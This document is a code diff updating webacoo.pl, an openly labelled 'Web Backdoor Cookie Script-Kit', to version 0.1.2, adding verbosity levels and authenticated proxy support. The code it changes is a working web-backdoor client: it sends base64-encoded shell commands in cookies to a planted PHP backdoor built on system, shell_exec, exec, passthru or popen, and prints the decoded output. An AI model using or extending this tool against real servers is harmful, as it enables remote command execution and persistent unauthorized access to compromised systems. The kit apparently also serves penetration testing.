@@ -15,7 +15,7 @@ my @phpsf = ("system", "shell_exec", "exec", "passthru", "popen");
 
 # Setup
 $WEBACOO{name} = "webacoo.pl";
-$WEBACOO{version} = '0.1.1';
+$WEBACOO{version} = '0.1.2';
 $WEBACOO{description} = 'Web Backdoor Cookie Script-Kit';
 $WEBACOO{author} = 'Anestis Bechtsoudis';
 $WEBACOO{email} = 'anestis@bechtsoudis.com';
@@ -31,6 +31,7 @@ $WEBACOO{rport} = '80';
 $WEBACOO{uri} = '';
 $WEBACOO{proxy_ip} = '';
 $WEBACOO{proxy_port} = '';
+$WEBACOO{vlevel} = 0;				# Default verbose level=0
 
 ## Help Global Variables ##
 my $command = '';
@@ -38,14 +39,22 @@ my $request = '';
 my $output = '';
 my $sock = '';
 
+# HTTP Proxy variables
+my @pargs = ();
+my $proxy_user = '';
+my $proxy_pass = '';
+
+# Verbose data
+my @verdata = ();
+
 # Print WeBaCoo logo
 print_logo();
 
 # Parse command args
-getopts("gf:ro:tu:c:a:d:p:h", \%args) or die "getopts() returned 0\n";
+getopts("gf:ro:tu:c:a:d:p:v:h", \%args) or die "getopts() returned 0\n";
 
 # Check for invalid arguments
-if($ARGV[0]) { print "Invalid option:$ARGV[0]\n"; exit; }
+if($ARGV[0]) { print "[-] Invalid option:$ARGV[0]\n"; exit; }
 
 # Print usage in -h case
 print_usage() if $args{h};
@@ -57,7 +66,7 @@ if(defined $args{g}) {
 
     # Check output filename
     if(!defined $args{o}) {
-        print "No output file specified!\n";
+        print "[-] No output file specified!\n";
 	exit;
     }
 
@@ -65,7 +74,7 @@ if(defined $args{g}) {
     if(defined $args{f}) {
         if($args{f} =~ /^[1-5]$/) { $WEBACOO{sfuntion} = $phpsf[$args{f}-1]; }
 	else { 
-	    print "-f $args{f}: Unknown function number!\n";
+	    print "[-] -f $args{f}: Unknown function number!\n";
 	    print "\nUse -h for help\n";
 	    exit;
 	}
@@ -82,7 +91,7 @@ if(defined $args{t}) {
 
     # Check URL
     if(!defined $args{u}) {
-	print "No url specified!\n";
+	print "[-] No url specified!\n";
 	exit;
     }
 
@@ -102,8 +111,18 @@ if(defined $args{t}) {
     if(defined $args{d}) { $WEBACOO{delim}=$args{d}; }
 
     # Delimiter cannot be equal to cookie name
-    if(defined$args{d} && defined $args{c} && ($args{d} eq $args{c})) { 
-	print "Use DELIM != C_NAME\n"; exit; 
+    if(defined $args{d} && defined $args{c} && ($args{d} eq $args{c})) { 
+	print "[-] Use DELIM != C_NAME\n"; exit; 
+    }
+
+    # Check for user specified verbose levels
+    if(defined $args{v}) {
+	if($args{v} =~ /^[0-2]$/) { $WEBACOO{vlevel} = $args{v}; }
+        else {
+            print "[-] -v $args{v}: Unknown verbosity level!\n";
+            print "\nUse -h for help\n";
+            exit;
+        }
     }
 
     # Print quit help message
@@ -169,7 +188,13 @@ Options:
 
   -a AGENT	HTTP header user-agent (default exist)
 
-  -p PROXY	Use proxy IP:PORT
+  -p PROXY	Use proxy (IP:PORT or USER:PASS:IP:PORT)
+
+  -v LEVEL	Verbose level
+	LEVEL
+		0: no additional info (default)
+		1: print HTTP headers
+		2: print HTTP headers + data
 
   -h		Display help and exit
 );
@@ -224,17 +249,30 @@ sub cmd_request
     my $dst_host = $WEBACOO{rhost};
     my $dst_port = $WEBACOO{rport};
 
-    # Proxy case
-    if(defined $args{p}) { ($dst_host,$dst_port)=split(':',$args{p}); }
+    # Check for Proxy args
+    if(defined $args{p}) { 
+	@pargs=split(':',$args{p});
+	if(@pargs==2) { ($dst_host, $dst_port) = @pargs; }
+	elsif(@pargs==4) { ($proxy_user, $proxy_pass, $dst_host, $dst_port) = @pargs; }
+	else { 
+	    print "[-] Invalid Proxy arguments!\n"; 
+	    print "\nUse -h for help\n";
+            exit; 
+	}
+    }
 
     # Form GET request
-    $request = "GET $WEBACOO{uri} HTTP/1.1\r\n";
+    $request = "GET http://$WEBACOO{rhost}$WEBACOO{uri} HTTP/1.1\r\n";
     $request .= "Host: $WEBACOO{rhost}:$WEBACOO{rport}\r\n";
     $request .= "Agent: $WEBACOO{agent}\r\n";
     $request .= "Connection: Close\r\n";
     $request .= "Cookie: cm=".encode_base64($command,'').";".
         " cn=$WEBACOO{cookie}; cp=$WEBACOO{delim}\r\n";
+    $request .= "Proxy-Authorization: Basic ".encode_base64($proxy_user.":".$proxy_pass,'')."\r\n" if($proxy_user && $proxy_pass);
     $request .= "\r\n";
+
+    # Print request if verbose level > 0
+    print "*** Request HTTP Header ***\n$request" if($WEBACOO{vlevel} > 0);
 
     # Establish connection
     my $sock=IO::Socket::INET->new(
@@ -255,6 +293,11 @@ sub cmd_request
     # Close socket
     close($sock);
 
+    # Split HTTP header + data and print according to verbose level
+    @verdata = split (/^\r\n/m,$output); 
+    print "*** Response HTTP Header ***\n$verdata[0]\n\n" if($WEBACOO{vlevel} > 0);
+    print "*** Response HTTP Data ***\n$verdata[1]\n\n" if($WEBACOO{vlevel} > 1);
+
     # Check for HTTP 4xx error status codes
     if($output =~ m/^HTTP\/1\.[0,1].+4\d{2}.+\n/)
     {
@@ -273,4 +316,8 @@ sub cmd_request
 
     # Decode response and print output
     print decode_base64($output);
+
+    # Flush content
+    @verdata = ();
+    $output = '';
 }
